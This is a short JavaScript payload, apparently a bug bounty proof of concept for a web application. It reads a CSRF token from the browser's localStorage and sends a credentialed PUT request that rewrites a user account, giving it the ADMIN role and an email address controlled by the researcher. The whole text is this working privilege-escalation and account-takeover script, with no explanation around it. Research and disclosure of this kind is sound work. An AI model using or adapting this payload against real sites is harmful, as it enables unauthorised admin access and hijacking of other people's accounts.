(()=>{
    const csrf = localStorage.getItem('csrfToken');
    
    fetch('/web/api2/v3/users/bFDIRISwpgbi7BfvMydhu0', {
        method: 'PUT',
        credentials: 'include',
        headers: {
            'Content-Type': 'application/json',
            'X-Csrf-Token': csrf
        },
        body: JSON.stringify({
            firstName: "User",
            lastName: "Triage",
            email: "aydilfhr+1@intigriti.me",
            userName: "aydilfhr",
            role: "ADMIN",
            timezone: "Europe/London",
            active: true,
            note: ""
        })
    })
    .then(r => r.text())
})();
